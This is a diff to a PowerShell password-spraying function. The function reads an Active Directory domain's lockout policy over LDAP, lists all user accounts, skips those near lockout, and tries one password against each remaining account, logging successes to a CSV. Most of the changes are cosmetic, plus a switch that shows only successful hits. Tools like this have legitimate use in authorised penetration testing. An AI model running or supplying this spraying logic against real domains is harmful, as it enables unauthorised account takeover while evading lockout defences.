@@ -1,8 +1,10 @@
 function PasswordSpray {
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory)][string]$Domain, 
-        [Parameter(Mandatory)][string]$Password
+        [string]$Domain, 
+        [string]$Password,
+		[switch]$JustSecess
+		
     )
 
 
@@ -47,17 +49,15 @@ function PasswordSpray {
     $domainDN = $root.defaultNamingContext
     if (-not $domainDN) { throw "Failed reading defaultNamingContext from RootDSE on $pdc" }
 
-    Write-Host "Using PDC Emulator: $($pdc)"
+    Write-Host "[+] Using PDC Emulator: $($pdc)" -ForegroundColor Yellow
+	Write-Host " "
 
   
     $de = New-Object DirectoryServices.DirectoryEntry("LDAP://$pdc/$domainDN")
     $sr = New-Object DirectoryServices.DirectorySearcher($de)
     $sr.SearchScope = "Base"
     $sr.Filter = "(objectClass=domainDNS)"
-    @(
-      "lockoutThreshold","lockoutDuration","lockoutObservationWindow",
-      "minPwdLength","maxPwdAge","minPwdAge","pwdHistoryLength","pwdProperties"
-    ) | ForEach-Object { [void]$sr.PropertiesToLoad.Add($_) }
+    @("lockoutThreshold","lockoutDuration","lockoutObservationWindow","minPwdLength","maxPwdAge","minPwdAge","pwdHistoryLength","pwdProperties") | ForEach-Object { [void]$sr.PropertiesToLoad.Add($_) }
 
     $res = $sr.FindOne()
     if (-not $res) { throw "Domain policy object not found on $pdc ($domainDN)" }
@@ -90,16 +90,16 @@ function PasswordSpray {
       PwdPropertiesFlags        = $PwdProperties
     }
 
-    Write-Host "[+] Got Domain Password Policy"
-    Write-Host "Lockout Threshold            -> $($PasswordPolicy.LockoutThreshold)"
-    Write-Host "Lockout Observation Window   -> $($PasswordPolicy.LockoutObservationWindowM) minutes"
-    Write-Host "Lockout Duration             -> $($PasswordPolicy.LockoutDurationM) minutes"
-    Write-Host "Minimum Password Length      -> $($PasswordPolicy.MinPasswordLength)"
-    Write-Host "Maximum Password Age (days)  -> $($PasswordPolicy.MaxPasswordAgeDays)"
-    Write-Host "Minimum Password Age (days)  -> $($PasswordPolicy.MinPasswordAgeDays)"
-    Write-Host "Password History Length      -> $($PasswordPolicy.PasswordHistoryLength)"
-    Write-Host "------------------------------------------------------------`n"
-
+    Write-Host "[+] Got Domain Password Policy :)" -ForegroundColor Yellow
+    Write-Host "	[*] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold)" -ForegroundColor Cyan
+    Write-Host "	[*] Lockout Observation Window   : $($PasswordPolicy.LockoutObservationWindowM) minutes" -ForegroundColor Cyan
+    Write-Host "	[*] Lockout Duration             : $($PasswordPolicy.LockoutDurationM) minutes" -ForegroundColor Cyan
+    Write-Host "	[*] Minimum Password Length      : $($PasswordPolicy.MinPasswordLength)" -ForegroundColor Cyan
+    Write-Host "	[*] Maximum Password Age (days)  : $($PasswordPolicy.MaxPasswordAgeDays)" -ForegroundColor Cyan
+    Write-Host "	[*] Minimum Password Age (days)  : $($PasswordPolicy.MinPasswordAgeDays)" -ForegroundColor Cyan
+    Write-Host "	[*] Password History Length      : $($PasswordPolicy.PasswordHistoryLength)" -ForegroundColor Cyan
+    Write-Host "=========================================================================" -ForegroundColor Yellow
+	Write-Host " "
 
     $entry    = New-Object DirectoryServices.DirectoryEntry("LDAP://$pdc/$domainDN")
     $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
@@ -108,8 +108,8 @@ function PasswordSpray {
     $searcher.SizeLimit = 0
     @("samAccountName","userAccountControl","memberOf","badPwdCount","badPasswordTime","pwdLastSet","lockoutTime") | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
 
-
-	Write-Host "[...]Query LDAP for getting all sam user accounts..."
+	
+	Write-Host "[...]Query LDAP for getting all sam user accounts..." -ForegroundColor Yellow
     $results = $searcher.FindAll()
 
     $nowUtc = (Get-Date).ToUniversalTime()
@@ -159,7 +159,8 @@ function PasswordSpray {
         }
     }
 
-    Write-Host "[...] Candidates loaded: $($users.Count)" -ForegroundColor Cyan
+    Write-Host "[+] Number of Targets $($users.Count) User Accounts" -ForegroundColor Yellow
+	Write-Host "[+] Starting.." -ForegroundColor Yellow
 
     foreach ($u in $users) {
         if ($u.lockoutTimeUTC) {
@@ -167,7 +168,7 @@ function PasswordSpray {
             continue
         }
         if ($u.NearLockout) {
-            Write-Host "[!] $($u.SamAccountName) has ONLY $($u.RemainingAttempts) attempt(s) left within window. Skipping." -ForegroundColor Yellow
+            Write-Host "[!] $($u.SamAccountName) has ONLY $($u.RemainingAttempts) attempt(s) left within window. Skipping." -ForegroundColor Gray
             continue
         }
 
@@ -184,7 +185,13 @@ function PasswordSpray {
             } | Export-Csv -Path $hitsCsv -NoTypeInformation -Append
         
         } else {
-            Write-Host "[-] Oh No.. User Account $($u.SamAccountName) is sad :( " -ForegroundColor DarkRed
+			if($JustSecess){
+				continue
+			}
+			else{
+				
+				Write-Host "[-] Oh No.. User Account $($u.SamAccountName) is sad :( " -ForegroundColor DarkRed
+			}
         }
     }
 }
